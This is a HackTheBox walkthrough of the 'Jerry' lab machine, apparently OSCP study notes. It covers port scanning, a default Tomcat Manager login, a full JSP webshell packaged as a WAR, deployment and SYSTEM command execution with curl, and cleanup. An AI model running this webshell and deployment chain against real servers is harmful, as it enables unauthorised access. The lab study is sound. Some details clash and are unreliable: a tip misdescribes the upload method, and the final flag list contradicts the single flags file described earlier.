---
tags: [HTB, Jerry, Windows, Tomcat, DefaultCredentials, WARUpload, JSP, SYSTEM, Easy]
platform: HackTheBox
os: Windows
hostname: JERRY
domain: None
difficulty: Easy
ip: $BoxIP
status: Complete
---

# HTB: Jerry, Full Walkthrough

## The gist

Jerry is a standalone Windows host running Apache Tomcat 7.0.88 on port 8080. The Tomcat Manager accepted a default credential, allowing a manually created JSP webshell to be uploaded as a WAR file. Tomcat was running as `NT AUTHORITY\\SYSTEM`, so the webshell immediately provided full control and no separate privilege escalation was needed.

## Box information

| Item | Value |
|---|---|
| Platform | HackTheBox |
| OS | Windows |
| Hostname | JERRY |
| Domain | None |
| Difficulty | Easy |
| IP | `$BoxIP` |

## Variables

```bash
boxset BoxName Jerry
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset BoxDir /home/kali/Platforms/HackTheBox/Jerry
boxset Domain ''
boxset Username tomcat
boxset Password $Password
boxset AdminUser Administrator
boxset WebPort 8080
```

Do not store real passwords or flag values in a shared write-up.

## 1. Workspace setup

I started with the helper so the standard folders, variables, and session log were created before scanning. The helper also keeps the command transcript tied to this box.

```bash
boxstart $BoxName $BoxIP htb
```

The workspace was created under `$BoxDir`. The attacker address was `$LocalIP` and the target address was kept in `$BoxIP`.

## 2. Full TCP scan

I scanned every TCP port before looking at versions. This prevents a service on an unusual port from being missed. `-Pn` skips host-discovery checks, which is useful when ICMP is filtered. `-n` disables DNS lookups, `-sS` sends a fast half-open SYN scan, and `--min-rate 5000` asks nmap to send probes quickly.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oA $BoxDir/nmap/allports
```

Only `$WebPort` was open. The remaining ports were filtered, so there was no SSH, SMB, RDP, or AD path to pursue.

![[jerry-2-allports.png]]

SCREENSHOT: Capture the full scan with only port 8080 open.

## 3. Service and version scan

I scanned the open port with `-sC` and `-sV`. `-sC` runs nmap's standard scripts, which add useful HTTP details. `-sV` performs version detection so the application and release can be identified.

```bash
sudo nmap -sC -sV -p $WebPort $BoxIP -oA $BoxDir/nmap/services
```

The service was Apache Tomcat/Coyote 7.0.88. The default landing page and the old release made the Tomcat Manager the next place to check.

Reference: [HackTricks: Tomcat Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)

![[jerry-3-services.png]]

SCREENSHOT: Capture the Tomcat 7.0.88 service and HTTP title.

## 4. Local setup

Jerry is standalone Windows, so there was no domain name or hosts-file entry to configure. I only recorded the web port for later commands.

```bash
boxset WebPort 8080
```

## 5. Tomcat Manager check

The Tomcat Manager is the administrative web application used to deploy and remove web applications. The HTML interface is normally at `/manager/html`. I first requested it without credentials and printed only the HTTP status with `-o /dev/null` and `-w`.

```bash
curl -s -o /dev/null -w "%{http_code}" http://$BoxIP:$WebPort/manager/html
```

The response was `401`, meaning the Manager exists but requires authentication. A `404` would mean the path was absent, while a `403` would mean the path exists but access is forbidden by policy.

> [!warning] 💡 Hint
> **Watch out:** A status-only request is useful here because it confirms the Manager path without saving or displaying a full error page.

## 6. Default credential test

Tomcat uses `tomcat-users.xml` to define local users and roles. Weak or unchanged deployment credentials are a common misconfiguration. I tested one well-known pair manually before considering a wordlist, because a single `200` response is faster and avoids unnecessary authentication attempts.

```bash
boxset Username tomcat
boxset Password $Password
curl -s -o /dev/null -w "%{http_code}" -u $Username:$Password http://$BoxIP:$WebPort/manager/html
loot cred $Username $Password
```

The Manager returned `200`, confirming valid credentials.

> [!tip] ⚡ More efficient path
> **What we did:** Checked one likely default pair with curl before trying a browser session or a larger credential list.
>
> **Faster approach:**
> ```bash
> curl -s -o /dev/null -w "%{http_code}" -u $Username:$Password http://$BoxIP:$WebPort/manager/html
> ```
> **Why:** The status code immediately confirms whether the candidate works, so there is no need to load the full Manager page or brute-force after the first successful pair.

![[jerry-6-manager-auth.png]]

SCREENSHOT: Capture the status-code-only request returning 200, with credentials hidden.

## 7. Create a JSP webshell

JSP is Java Server Pages, which lets Tomcat execute Java code when a page is requested. The import line brings in `java.io.*`, which supplies the `InputStream` and `Process`-related classes used to start a command and read its output. A WAR file is a ZIP-form Java web application archive that Tomcat can deploy.

`Runtime` is Java's interface to the environment where the application is running. `Runtime.getRuntime()` gets that interface, and `exec(new String[]{...})` starts the requested process. The array form is deliberate: Java receives the executable and each argument separately, instead of splitting one string on spaces. A single string can break when a Windows path or command argument contains spaces. `cmd.exe` is the outer Windows command interpreter, and `/c` tells it to run the supplied command and then exit.

The returned `Process` object represents the running Windows command. `p.getInputStream()` reads that process's standard output, which is the normal command result. This page reads stdout rather than stderr because the useful output from commands such as `whoami` is written to stdout. Errors sent to stderr are not included by this minimal page.

The byte array is a buffer. The loop reads chunks into that buffer instead of requesting one character at a time, then appends each chunk to the `StringBuffer`. This reduces overhead and also handles output longer than a single read. Finally, `out.print(sb.toString())` writes the collected text into the JSP response body. The browser or curl receives that response body, which is how the command output comes back to us.

```bash
cat > /tmp/cmd.jsp <<'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", request.getParameter("cmd")});
InputStream is = p.getInputStream();
byte[] b = new byte[65536];
int l;
StringBuffer sb = new StringBuffer();
while ((l = is.read(b)) != -1) sb.append(new String(b, 0, l));
out.print(sb.toString());
%>
EOF
cd /tmp && zip jerry.war cmd.jsp
mv /tmp/jerry.war $BoxDir/www/jerry.war
cd $BoxDir
```

The archive contained `cmd.jsp` and was ready for deployment.

Reference: [PayloadsAllTheThings: Java Webshells](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Shells)

## 8. Deploy the WAR through the text API

The `/manager/text/` API accepts simple HTTP requests and returns plain text. It is quicker and easier to reproduce than browser navigation through the HTML Manager. The `--upload-file` option sends the WAR as the request body, and the `update=true` parameter allows an existing context to be replaced.

```bash
curl -s -u $Username:$Password \
  --upload-file $BoxDir/www/jerry.war \
  "http://$BoxIP:$WebPort/manager/text/deploy?path=/jerry&update=true"
```

Output:

```text
OK - Deployed application at context path /jerry
```

Reference: [Apache Tomcat 7 Manager App HOW-TO](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html)

> [!tip] ⚡ More efficient path
> **What we did:** Used the HTML Manager interface to upload the WAR.
>
> **Faster approach:**
> ```bash
> curl -s -u $Username:$Password --upload-file $BoxDir/www/jerry.war "http://$BoxIP:$WebPort/manager/text/deploy?path=/jerry&update=true"
> ```
> **Why:** The text API performs the deployment in one repeatable command and avoids browser forms, CSRF tokens, and manual navigation.

## 9. Execute commands as SYSTEM

I requested the JSP with `-G` so curl placed the command in the query string. `--data-urlencode` safely encodes spaces and shell characters before sending the `cmd` parameter. The response returned `nt authority\\system`, proving that Tomcat itself was running as SYSTEM. Because the web process already had the highest Windows identity, no separate privilege escalation was required.

```bash
curl -s -G "http://$BoxIP:$WebPort/jerry/cmd.jsp" \
  --data-urlencode "cmd=whoami"
```

Output:

```text
nt authority\system
```

The Manager credentials were not needed to call the deployed `/jerry/cmd.jsp` page.

Reference: [Apache Tomcat 7 Windows Service HOW-TO](https://tomcat.apache.org/tomcat-7.0-doc/windows-service-howto.html)

![[jerry-9-foothold-system.png]]

SCREENSHOT: Capture the `whoami` result showing SYSTEM.

## 10. Confirm both flags without exposing values

Both flags were stored in one text file below the Administrator desktop. I listed the desktop and flags directory first, then confirmed the file path. The filename contains spaces, so the Windows path must be double-quoted inside the command, while the Bash `--data-urlencode` argument is single-quoted or otherwise carefully quoted.

```bash
curl -s -G "http://$BoxIP:$WebPort/jerry/cmd.jsp" \
  --data-urlencode 'cmd=dir C:\Users\'$AdminUser'\Desktop /b'
curl -s -G "http://$BoxIP:$WebPort/jerry/cmd.jsp" \
  --data-urlencode 'cmd=dir C:\Users\'$AdminUser'\Desktop\flags /b'
```

The `flags` directory and its single flag file were present. The file contained both the user and root flag values, but those values were not displayed in this write-up.

I then read the file privately and stored the two results with the loot helper. The values are represented by variables here and are not printed.

```bash
curl -s -G "http://$BoxIP:$WebPort/jerry/cmd.jsp" \
  --data-urlencode "cmd=type \"C:\Users\\$AdminUser\Desktop\flags\2 for the price of 1.txt\""
loot flag user $UserFlag
loot flag root $RootFlag
```

Flag breakdown:

- User flag: confirmed in the shared flags file, value omitted.
- Root flag: confirmed in the same shared flags file, value omitted.

> [!warning] 💡 Hint
> **Watch out:** A filename with spaces needs a double-quoted Windows path and careful Bash quoting. `--data-urlencode` is safer than manually inserting `+` characters, especially when backslashes are present.

The two confirmations were recorded privately without saving the values in this file.

```bash
shot flags
```

![[jerry-10-flags.png]]

SCREENSHOT: Capture the two flag paths or filenames without capturing their contents.

## 11. Clean-down

I undeployed the application through the same text API used for deployment. This removes the deployed webshell from Tomcat rather than leaving an uploaded application behind.

```bash
curl -s -u $Username:$Password \
  "http://$BoxIP:$WebPort/manager/text/undeploy?path=/jerry"
```

Output:

```text
OK - Undeployed application at context path /jerry
```

I verified the old application path returned `404`, then cleared the local box marker and removed the local workspace.

```bash
curl -s -o /dev/null -w "%{http_code}" http://$BoxIP:$WebPort/jerry/cmd.jsp
boxdone
```

The webshell returned `404`. No accounts, persistence, or other target-side changes were created. The local workspace was removed after the run.

Reference: [Apache Tomcat 7 HTML Manager HOW-TO](https://tomcat.apache.org/tomcat-7.0-doc/html-manager-howto.html)

> [!tip] ⚡ More efficient path
> **What we did:** Left cleanup to a manual browser action or assumed the application was gone after undeployment.
>
> **Faster approach:**
> ```bash
> curl -s -u $Username:$Password "http://$BoxIP:$WebPort/manager/text/undeploy?path=/jerry"
> curl -s -o /dev/null -w "%{http_code}" http://$BoxIP:$WebPort/jerry/cmd.jsp
> ```
> **Why:** The API removes the application directly, and the second request proves the old webshell no longer answers.

## Credentials

| Account | Source | Use |
|---|---|---|
| `tomcat` | Default Tomcat Manager credential | Deploy the WAR application |

Passwords are intentionally omitted.

## Key lessons

- Scan every TCP port before service detection so an unusual Tomcat port is not missed.
- A `401` response proves the Manager path exists and needs authentication.
- Test a likely default credential manually before using a larger wordlist.
- A WAR file is a deployable Java web application, and a JSP page can provide command execution when deployed by Tomcat.
- On Windows, the account running Tomcat determines the privilege level of code executed by a JSP.
- `--data-urlencode` handles spaces and special characters more safely than manually building a query string.
- Both flags can be stored in one file, so enumerate directories before assuming there is one file per flag.
- Always undeploy test applications and verify the old URL returns 404.
- Watch the ippsec walkthrough: [Jerry](https://ippsec.rocks/?#Jerry)

## Checklist

- [x] Workspace initialised
- [x] Full TCP scan completed
- [x] Tomcat version identified
- [x] Manager authentication tested
- [x] WAR webshell created and deployed
- [x] SYSTEM execution confirmed
- [x] Both flag paths confirmed without displaying values
- [x] Webshell undeployed and verified with 404
- [x] Local workspace removed
## RUNBOOK V2 Stages Used

- [[RUNBOOK V2/Windows - Service Scan]] -- technique used in this walkthrough
- [[RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
- [[RUNBOOK V2/Windows - Web - Tomcat]] -- technique used in this walkthrough
- [[RUNBOOK V2/Windows - Shell Received]] -- technique used in this walkthrough

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- shares a similar enumeration or escalation pattern

## External Resources

- https://www.exploit-db.com/search?q=Jerry
- https://ippsec.rocks/?q=Jerry
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.

## Attack Chain

1. [[RUNBOOK V2/Windows - Service Scan]] identified the Tomcat service and its version.
2. [[RUNBOOK V2/Windows - Web Enum]] located the manager application.
3. The manager accepted the recovered login, and the WAR upload supplied a JSP command shell.
4. [[RUNBOOK V2/Windows - Shell Received]] confirmed that Tomcat was already running with SYSTEM-level privileges.

## Flags

- `user.txt`: `$UserFlag` (keep the value private)
- `root.txt`: `$RootFlag` (keep the value private)
- `proof.txt`: `$ProofFlag` (keep the value private)

## Lessons Learned

- Management interfaces should be tested with carefully scoped default-credential checks.
- Confirm the service account before assuming a separate privilege-escalation step is needed.
